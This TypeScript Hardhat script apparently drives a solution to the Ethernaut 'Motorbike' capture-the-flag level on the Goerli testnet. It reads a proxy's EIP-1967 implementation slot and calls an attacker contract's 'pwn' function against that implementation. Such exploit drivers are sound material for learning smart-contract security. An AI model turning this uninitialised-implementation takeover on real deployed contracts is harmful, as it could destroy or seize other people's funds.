import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x596C3c3FCb7d060E1B3e62A47D8a7CD2018E2245"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "address",
          name: "_logic",
          type: "address",
        },
      ],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      stateMutability: "payable",
      type: "fallback",
      payable: true,
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Motorbike")
  const implementation = await provider.getStorageAt(
    targetAddress,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
  )
  // console.log("implementation", `0x${implementation.substring(26)}`)
  const tx = await contract.pwn(`0x${implementation.substring(26)}`, {
    gasLimit: 300000,
  })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
